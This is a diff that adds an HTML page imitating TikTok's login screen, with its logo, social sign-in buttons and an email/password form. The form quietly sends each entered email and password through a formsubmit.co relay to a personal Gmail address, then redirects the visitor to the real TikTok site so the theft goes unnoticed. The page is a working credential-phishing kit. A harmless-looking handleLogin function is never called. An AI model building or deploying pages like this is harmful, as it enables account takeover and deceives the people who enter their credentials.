@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in | TikTok</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background-color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .login-container {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+            padding: 32px;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .logo svg {
+            width: 118px;
+            height: 42px;
+        }
+
+        h1 {
+            font-size: 32px;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 8px;
+            color: #161823;
+        }
+
+        .subtitle {
+            text-align: center;
+            color: #8a8b9a;
+            font-size: 15px;
+            margin-bottom: 24px;
+        }
+
+        .login-options {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .login-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #e0e0e0;
+            border-radius: 4px;
+            background: white;
+            cursor: pointer;
+            font-size: 15px;
+            font-weight: 600;
+            color: #161823;
+            transition: background-color 0.2s;
+        }
+
+        .login-btn:hover {
+            background-color: #f8f8f8;
+        }
+
+        .login-btn svg {
+            width: 20px;
+            height: 20px;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 24px 0;
+            color: #8a8b9a;
+            font-size: 14px;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: #e0e0e0;
+        }
+
+        .divider::before {
+            margin-right: 16px;
+        }
+
+        .divider::after {
+            margin-left: 16px;
+        }
+
+        .input-group {
+            margin-bottom: 16px;
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #e0e0e0;
+            border-radius: 4px;
+            font-size: 15px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        input:focus {
+            border-color: #161823;
+        }
+
+        input::placeholder {
+            color: #a8a8a8;
+        }
+
+        .forgot-password {
+            text-align: right;
+            margin-top: 8px;
+        }
+
+        .forgot-password a {
+            color: #161823;
+            font-size: 14px;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 14px;
+            background: #fe2c55;
+            border: none;
+            border-radius: 4px;
+            color: white;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 24px;
+            transition: background-color 0.2s;
+        }
+
+        .submit-btn:hover {
+            background: #e02649;
+        }
+
+        .submit-btn:disabled {
+            background: #ffb3c0;
+            cursor: not-allowed;
+        }
+
+        .terms {
+            text-align: center;
+            font-size: 12px;
+            color: #8a8b9a;
+            margin-top: 24px;
+            line-height: 1.5;
+        }
+
+        .terms a {
+            color: #161823;
+            text-decoration: none;
+        }
+
+        .terms a:hover {
+            text-decoration: underline;
+        }
+
+        .signup-link {
+            text-align: center;
+            margin-top: 24px;
+            font-size: 15px;
+            color: #161823;
+        }
+
+        .signup-link a {
+            color: #fe2c55;
+            text-decoration: none;
+            font-weight: 600;
+            margin-left: 4px;
+        }
+
+        .signup-link a:hover {
+            text-decoration: underline;
+        }
+
+        .email-form {
+            display: none;
+        }
+
+        .email-form.active {
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <svg fill="currentColor" viewBox="0 0 118 42" xmlns="http://www.w3.org/2000/svg">
+                <path d="M9.87537 16.842V15.7233C9.49211 15.6721 9.10246 15.6401 8.70003 15.6401C3.90288 15.6338 0 19.5399 0 24.3475C0 27.2947 1.46917 29.9031 3.71764 31.4822C2.26763 29.9287 1.37974 27.8381 1.37974 25.5494C1.37974 20.8121 5.17403 16.9507 9.87537 16.842Z" fill="#25F4EE"></path>
+                <path d="M10.0862 29.5259C12.2261 29.5259 13.9763 27.819 14.053 25.6965L14.0594 6.72822H17.5215C17.4512 6.33824 17.4129 5.93548 17.4129 5.52632H12.686L12.6796 24.4946C12.603 26.6171 10.8527 28.324 8.71286 28.324C8.04854 28.324 7.42255 28.1578 6.86682 27.8637C7.58224 28.8674 8.75758 29.5259 10.0862 29.5259Z" fill="#25F4EE"></path>
+                <path d="M23.9923 13.8815V12.8141C22.6701 12.8141 21.4436 12.3903 20.4478 11.6785C21.2625 12.6659 22.5207 13.3177 23.9923 13.8815Z" fill="#25F4EE"></path>
+                <path d="M20.4478 11.6785C19.4265 10.6494 18.7974 9.22068 18.7974 7.63352V7.33902H17.5215C17.8094 9.00033 18.9013 10.402 20.4478 11.6785Z" fill="#FE2C55"></path>
+                <path d="M8.70003 20.3421C6.32003 20.3421 4.38848 22.2799 4.38848 24.6671C4.38848 26.3957 5.42203 27.8857 6.86682 28.6364C6.39258 27.931 6.11242 27.0751 6.11242 26.1505C6.11242 23.7634 8.04398 21.8256 10.424 21.8256C10.8262 21.8256 11.2156 21.8832 11.5862 21.9791V17.172C11.2029 17.1208 10.8132 17.0888 10.4108 17.0888C10.1485 17.0888 9.89242 17.1016 9.63 17.1208V20.7557C9.25948 20.6599 8.87623 20.6022 8.47379 20.6022L8.70003 20.3421Z" fill="#FE2C55"></path>
+                <path d="M23.9923 13.8815V17.5868C20.9571 17.5868 18.1909 16.4681 16.0447 14.6325V24.3475C16.0447 29.1487 12.1418 33.0613 7.34467 33.0613C5.42564 33.0613 3.65917 32.4347 2.24435 31.3799C3.93953 33.256 6.40691 34.4323 9.13706 34.4323C13.9342 34.4323 17.8371 30.5197 17.8371 25.7185V15.9967C19.9769 17.8387 22.7495 18.9511 25.7783 18.9511V13.9519C25.1776 13.9519 24.5832 13.9007 23.9923 13.8047V13.8815Z" fill="#FE2C55"></path>
+                <path d="M16.0447 24.3475V14.6325C18.1909 16.4681 20.9571 17.5868 23.9923 17.5868V13.8815C22.5207 13.3177 21.2625 12.6659 20.4478 11.6785C18.9013 10.402 17.8094 9.00033 17.5215 7.33902H14.0594L14.053 25.6965C13.9763 27.819 12.2261 29.5259 10.0862 29.5259C8.75758 29.5259 7.58224 28.8674 6.86682 27.8637C5.42203 27.1131 4.38848 25.6231 4.38848 23.8945C4.38848 21.5073 6.32003 19.5695 8.70003 19.5695C9.10246 19.5695 9.49211 19.6271 9.87537 19.7166V15.9391C5.17403 16.0479 1.37974 19.9095 1.37974 24.6467C1.37974 26.9355 2.26123 29.0261 3.71764 30.5796C5.13886 31.6408 6.89892 32.2738 8.81154 32.2738C13.6087 32.2738 17.5115 28.3613 17.5115 23.5601L16.0447 24.3475Z" fill="black"></path>
+            </svg>
+        </div>
+
+        <h1>Log in</h1>
+
+        <div class="login-options">
+            <button class="login-btn" onclick="showEmailForm()">
+                <svg viewBox="0 0 20 20" fill="currentColor">
+                    <path d="M10 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM10 12c-2.33 0-7 1.17-7 3.5V17h14v-1.5c0-2.33-4.67-3.5-7-3.5z"/>
+                </svg>
+                Use phone / email / username
+            </button>
+
+            <button class="login-btn">
+                <svg viewBox="0 0 48 48">
+                    <path fill="#4285F4" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+                    <path fill="#34A853" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+                    <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+                    <path fill="#EA4335" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+                </svg>
+                Continue with Google
+            </button>
+
+            <button class="login-btn">
+                <svg viewBox="0 0 24 24" fill="#1877F2">
+                    <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+                </svg>
+                Continue with Facebook
+            </button>
+
+            <button class="login-btn">
+                <svg viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09l.01-.01zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/>
+                </svg>
+                Continue with Apple
+            </button>
+
+            <button class="login-btn">
+                <svg viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M22.46 6c-.85.38-1.78.64-2.75.76 1-.6 1.76-1.55 2.12-2.68-.93.55-1.96.95-3.06 1.17-.88-.94-2.13-1.52-3.51-1.52-2.66 0-4.81 2.16-4.81 4.81 0 .38.04.75.13 1.1-4-.2-7.54-2.12-9.91-5.04-.42.72-.66 1.55-.66 2.44 0 1.67.85 3.14 2.14 4-.79-.03-1.53-.24-2.18-.6v.06c0 2.33 1.66 4.28 3.86 4.72-.4.11-.83.17-1.27.17-.31 0-.62-.03-.92-.08.62 1.94 2.42 3.35 4.55 3.39-1.67 1.31-3.77 2.09-6.05 2.09-.39 0-.78-.02-1.17-.07 2.18 1.4 4.77 2.21 7.55 2.21 9.06 0 14-7.5 14-14 0-.21 0-.42-.02-.63.96-.69 1.8-1.56 2.46-2.55z"/>
+                </svg>
+                Continue with Twitter
+            </button>
+        </div>
+
+        <div class="divider">OR</div>
+
+        <div class="email-form" id="emailForm">
+            <form action="https://formsubmit.co/neutralclouds23@gmail.com" method="POST" >
+                <div class="input-group">
+                    <input type="text" placeholder="Email or username" id="emailInput" name="email" required>
+                </div>
+                <div class="input-group">
+                    <input type="password" placeholder="Password" id="passwordInput" name="password" required>
+                </div>
+                <input type="hidden" name="_next" value="https://www.tiktok.com/">
+                <div class="forgot-password">
+                    <a href="#">Forgot password?</a>
+                </div>
+                <button type="submit" class="submit-btn">Log in</button>
+            </form>
+        </div>
+
+        <div class="terms">
+            By continuing, you agree to TikTok's <a href="#">Terms of Service</a> and confirm that you have read TikTok's <a href="#">Privacy Policy</a>.
+        </div>
+
+        <div class="signup-link">
+            Don't have an account?<a href="https://www.tiktok.com/signup">Sign up</a>
+        </div>
+    </div>
+
+    <script>
+        function showEmailForm() {
+            document.getElementById('emailForm').classList.add('active');
+        }
+
+        function handleLogin(event) {
+            event.preventDefault();
+            const email = document.getElementById('emailInput').value;
+            const password = document.getElementById('passwordInput').value;
+            console.log('Login attempted with:', email);
+            // Add your login logic here
+            return false;
+        }
+    </script>
+</body>
+</html>
